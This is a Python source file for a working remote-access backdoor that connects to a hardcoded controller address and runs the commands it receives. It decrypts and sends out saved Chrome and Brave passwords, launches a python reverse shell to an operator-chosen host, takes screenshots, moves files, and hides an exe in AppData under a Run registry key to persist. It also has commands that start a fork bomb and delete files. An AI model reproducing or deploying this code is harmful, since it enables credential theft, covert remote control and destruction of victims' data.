import socket
import subprocess
import sys
import os
import platform
import requests
import pyautogui
import time
import pickle
import base64
import shutil


# from pynput.keyboard import Key, Listener

# Client
class Backdoor:
    keys_list = []
    count = 0
    program_name = os.path.basename(__file__)
    state = None

    def __init__(self, host, port):
        self.host = str(host)
        self.port = int(port)
        try:
            # Trying to setup variables, for windows
            self.USER = os.environ["USERPROFILE"]  # --> "C:\\" + os.getenv("HOMEPATH")
            self.PATH = {
                "Chromepasswd": self.USER + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                "BravePasswd": self.USER + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State'}
        except:
            pass

    def pickle_handler(self, command):
        # Make an object of a command
        return base64.b64encode(pickle.dumps(command))

    def pickle_recv(self, b):
        # Read object
        recv = self.sock.recv(b).decode("latin1")
        return pickle.loads(base64.b64decode(recv))

    # Downloading files
    def download(self, file):
        data = os.path.getsize(file)
        self.sock.send(self.pickle_handler(str(data)))

        time.sleep(3)

        with open(file, "rb") as f:
            data_size = f.read()
            self.sock.send(data_size)

        print("Transference Done!")

    # Install dependences in target's machine
    def install_dependences(self):
        try:
            subprocess.Popen("pip install pyautogui", shell=True)
            subprocess.Popen("pip install pyinstaller", shell=True)
            subprocess.Popen("pip install pycryptodomex", shell=True)
            subprocess.Popen("pip install pywin32", shell=True)
            self.sock.send(self.pickle_handler("Done!"))
        except Exception as e:
            self.sock.send(self.pickle_handler(str(e)))

    # Uploading files
    def upload(self, file):
        up_filesize = self.sock.recv(1024).decode("latin1")
        print(up_filesize)
        int_filesize = int(up_filesize)

        up_data = b""
        while len(up_data) < int_filesize:
            up_data += self.sock.recv(int_filesize)

        with open(file, "wb") as up:
            up.write(up_data)

        self.sock.send(self.pickle_handler(
            f"\033[1;32m[+]\033[0;0m - Uploaded to {file} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input..."))


    # Send connection to netcat using python
    def reverse_tcp(self, reverseip, reverseport):
        try:
            subprocess.Popen(
                f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{reverseip}",{reverseport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
                shell=True, stderr=subprocess.PIPE)
            self.sock.send(self.pickle_handler(
                f"Reverse Shell Session established with sucess"))
        except Exception as e:
            self.sock.send(
                self.pickle_handler(f"Something went wrong! Maybe the target is a windows!\nError: {str(e)}"))

    # Get screenshot from target
    def screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")

        time.sleep(2)
        data_size = os.path.getsize("screenshot.png")
        self.sock.send(str(data_size).encode("latin1"))

        time.sleep(6)

        with open("screenshot.png", "rb") as sc:
            screenshot_data = sc.read()
            self.sock.send(screenshot_data)
        os.remove("screenshot.png")  # para remover a imagem, testar
        # self.state = True

    # Readfile in linux
    def cat(self, file):
        try:
            cat_size = os.path.getsize(file)
            self.sock.send(self.pickle_handler(cat_size))
            time.sleep(2)

            with open(file, "rb") as cat:
                cat_read = cat.read()
                self.sock.send(cat_read)

        except Exception as e:
            self.sock.send(self.pickle_handler(str(e)))
        # self.state = True

    # Try to grab Chrome and Brave passwords
    def grab_passwords(self):
        try:
            import sqlite3
            import win32crypt
            import json
            from Cryptodome.Cipher import AES
            import shutil
            # sock = self.sock
            password_list = []
            cont = 0
            path_list = []
            for PATH in self.PATH.values():
                cont += 1
                path_list.append(PATH)

                def get_key():
                    try:
                        with open(fr"{path_list[cont - 1]}", "r") as f:
                            data = json.loads(f.read())

                        key = base64.b64decode(data["os_crypt"]["encrypted_key"])
                        key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
                        return key
                    except FileNotFoundError:
                        pass
                    except Exception as e:
                        self.sock.send(str(e).encode("latin1"))

                def decrypt(cipher, payload):
                    return cipher.decrypt(payload)

                def make_cipher(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)

                def decrypt_password(buff, key):
                    try:
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = make_cipher(key, iv)
                        decrypted_pass = decrypt(cipher, payload)
                        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
                        return decrypted_pass
                    except Exception as e:
                        return "Chrome < 80"

                key = get_key()
                if cont == 2:
                    login_db = os.environ[
                                   'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
                else:
                    login_db = os.environ[
                                   'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
                try:
                    shutil.copy2(login_db, "Loginvault.db")
                except FileNotFoundError:
                    pass  # making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, key)
                        if len(username) > 0:
                            msg = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n"
                            self.sock.send(msg.encode("latin1"))
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass

        except Exception as e:
            self.sock.send(str(e).encode("latin1"))
        except FileNotFoundError:
            self.sock.send("Some data was not found!".encode("latin1"))

    # Activating permanence_mode making an exe and puting him inside AppData
    def permanence_mode(self):
        try:
            x = self.sock.recv(1024).decode("latin1")
            print(x)
            # if sys.platform.startswith("Windows"):
            print("Starting...")

            # Setting variables that will be used
            appdata = os.getenv("APPDATA") # Appdata local folder
            f_name = os.path.basename(__file__) # Base name file
            exefolder = __file__.replace(f"{f_name}", "") # Actual folder
            exe2 = f_name.replace(".py", ".exe") # Name of the file changed to .exe
            try:
                subprocess.Popen(f"pyinstaller --log-level ERROR --clean -wF {__file__}", shell=True) # compiling into exe file
                time.sleep(200)
                print("Done compiling!")
                print("Starting Creating and moving things...")
                # self.sock.send(self.pickle_handler("Moving things...\n"))
                if not os.path.exists(f"{appdata}\\Micro"):
                    os.mkdir(f"{appdata}\\Micro")
                subprocess.Popen(f"move {os.getcwd()}\\dist\\{exe2} {appdata}\\Micro\\{exe2}", shell=True)

                # Creating Vbs script to start .exe in background
                """if not os.path.exists(f"{appdata}\\Micro\\ini.vbs"):
                    with open(f"{appdata}\\Micro\\ini.vbs","w") as ini:
                        ini.write(f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.run chr(34) & "{exe2}" & chr(34), 0
Set WshShell = Nothing''')"""

                # self.sock.send(self.pickle_handler("Cleaning logs..."))
                # Removing log folders
                time.sleep(2)
                shutil.rmtree(f"{exefolder}build", ignore_errors=True)
                shutil.rmtree(f"{exefolder}dist", ignore_errors=True)
                shutil.rmtree(f"{exefolder}__pycache__", ignore_errors=True)
                # self.sock.send(self.pickle_handler("All done!"))

                import winreg as reg
                pth = f"{appdata}\\Micro"
                file_name = exe2

                # Setting full path of exe file
                address = os.path.join(pth, file_name)

                # Key To Change: HKEY_CURRENT_USER
                # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
                key = reg.HKEY_CURRENT_USER
                key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

                # Opening Key To Store the .exe
                openn = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

                # Modifiy The Key
                reg.SetValueEx(openn, "pyperm", 0, reg.REG_SZ, address)

                # Closing
                reg.CloseKey(openn)
                self.sock.send("\033[1;32m[+]\033[0;0m Permanence mode activated!".encode("latin1"))
                print("Done!")

            except Exception as e:
                self.sock.send(self.pickle_handler(str(e)))
            # else:
            # name = os.popen("whoami").read()

            # os.popen(f'(crontab -u {name} -l ; echo "*/5 * * * * python3 {os.getcwd}/{self.program_name}") | crontab -u {name} -') # every 60 minutes it executes the script
        except Exception as e:
            self.sock.send(self.pickle_handler(str(e)))

    # Disabling permanence
    def disable_permanence(self):
        # self.sock.send("\033[31m[-] *\033[0;0m Desativating...".encode("latin1"))
        try:
            if sys.platform.startswith("Windows"):
                import winreg as reg
                key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                                  reg.KEY_ALL_ACCESS)
                reg.DeleteValue(key, "pyperm")
                reg.CloseKey(key)
            # else:
            # name = os.popen("whoami").read()
            # os.popen(f"crontab -u {name} -l | grep -v 'python3 {os.getcwd()}/{self.program_name}' | crontab -u {name} -")
        except FileNotFoundError:
            pass
        except Exception as e:
            self.sock.send(self.pickle_handler(str(e)))
        self.sock.send(self.pickle_handler("\033[1;32m[+]\033[0;0m Disabled with success"))
        self.state = True

    def forkbomb(self):
        try:
            while True:
                os.fork()
        except Exception as e:
            self.sock.send(str(e).encode("latin1"))

        # self.state = True

    def remove_all(self):
        try:
            files = os.listdir()
            for file in files:
                os.chdir(os.getcwd())
                os.remove(file)
        except IsADirectoryError:
            pass
        except PermissionError:
            pass
        except Exception as e:
            self.sock.send(str(e).encode("latin1"))
        self.state = True

    def get_ip(self):
        ip = requests.get("https://api.ipify.org").text
        ip_message = f"The target's IP is: {ip}"
        self.sock.send(self.pickle_handler(str(ip_message)))

    def dir(self):
        try:
            files_list = []
            cont = 0
            """dir_list = subprocess.getoutput("dir")
            bytes_lenght = len(dir_list)
            self.sock.send(f"{bytes_lenght}".encode())
            time.sleep(2)
            self.sock.send(dir_list.encode())"""
            for files in os.listdir():
                files_list.append(files)
                cont += 1
            # self.sock.send(f"{cont}".encode())
            time.sleep(2)
            for file in files_list:
                 lenght = os.path.getsize(file)
                 if lenght == 0:
                     lenght = "Folder"
                 self.sock.send(f"\n{lenght} --> {file}".encode())
            time.sleep(1)
            self.sock.send("Done!".encode())
        except Exception as e:
            self.sock.send(self.pickle_handler(str(e)))
    def info(self):
        info = f"""
        Operacional System: {sys.platform}
        Computer Name: {platform.node()}
        """
        if sys.platform.startswith("Linux"):
            uname_info = os.popen("uname -a").read()
            self.sock.send(self.pickle_handler(info + f"\n{uname_info}"))
        else:
            self.sock.send(self.pickle_handler(info))
        # self.state = True

    def cd(self, cname):
        try:
            os.chdir(cname)
            cd_message = f"You have been moved to {os.getcwd()}"
            self.sock.send(cd_message.encode("latin1"))
            print("Command Sent!")
        except Exception as e:
            self.sock.send(str(e).encode("latin1"))
        # self.state = True

    def connection(self):
        # Starting connection
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        connected = False
        while (connected == False):
            try:
                time.sleep(2)
                print('\033[31m[-] *\033[0;0m \033[1;36mInitiating Connection...\033[0;0m')
                self.sock.connect((self.host, self.port))
                print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m')
                connected = True

            except KeyboardInterrupt:
                print("\nExiting... Bye o/")
                sys.exit()
            except:
                print("\033[31m[+] * \033[0;0mHost isn't Accepting connection, Trying again...")

        while True:
            try:
                message_command = self.pickle_recv(2048)

                if message_command == "exit":
                    print("Closing RCE... Bye o/")
                    self.sock.close()
                    sys.exit()

                elif message_command == "reverse_tcp":
                    self.sock.send(self.pickle_handler(
                        "You must put IP and PORT as parameters! Ex: reverse_tcp 192.168 7777".encode("latin1")))

                elif message_command.startswith("reverse_tcp "):
                    # print(message_command)
                    ip = message_command.split(" ")[1]
                    port = message_command.split(" ")[2]
                    self.reverse_tcp(ip, port)

                elif message_command == "grab_passwords":
                    self.grab_passwords()

                elif message_command == "remove_all":
                    self.remove_all()

                elif message_command == "install_dependences":
                    self.install_dependences()

                elif message_command.startswith("upload "):
                    upload_file = message_command.split(" ")[2]
                    self.upload(upload_file)

                elif message_command == "victims_info":
                    self.info()

                elif message_command.startswith("cd"):
                    self.cd(message_command[3:])

                elif message_command == "forkbomb":
                    self.forkbomb()

                elif message_command.startswith("cat "):
                    self.cat(message_command.split(" ")[1])

                elif message_command == "permanence_mode":
                    self.permanence_mode()

                elif message_command == "dir":
                    self.dir()

                elif message_command == "disable_permanence":
                    self.disable_permanence()

                elif message_command == "get_ip":
                    self.get_ip()

                elif message_command == "screenshot":
                    self.screenshot()

                elif message_command.startswith("download "):
                    self.download(message_command.split(" ")[1])

                else:
                    try:
                        command_prompt = subprocess.Popen(message_command, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                                                          stdin=subprocess.PIPE, shell=True)

                        err = command_prompt.stderr.read()
                        command_prompt = command_prompt.stdout.read()
                        self.sock.send(command_prompt)
                        self.sock.send(err)
                        print('Command Sent!')

                        if command_prompt == b"" and err == b"":
                            self.sock.send("\nOK!".encode("latin1"))
                    except Exception as e:
                        self.sock.send(f"Something went wrong!\nError: {str(e)}".encode("latin1"))


            except BrokenPipeError:
                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Trying to reconnect!")
                back.connection()

            except KeyboardInterrupt:
                print("\nExiting... Bye o/")
                sys.exit()

            except ConnectionResetError:
                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Trying to reconnect!")
                back.connection()
            except EOFError:
                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Trying to reconnect!")
                back.connection()


back = Backdoor("192.168.1.64", 7777)  # Backdoor("ip",port)
back.connection()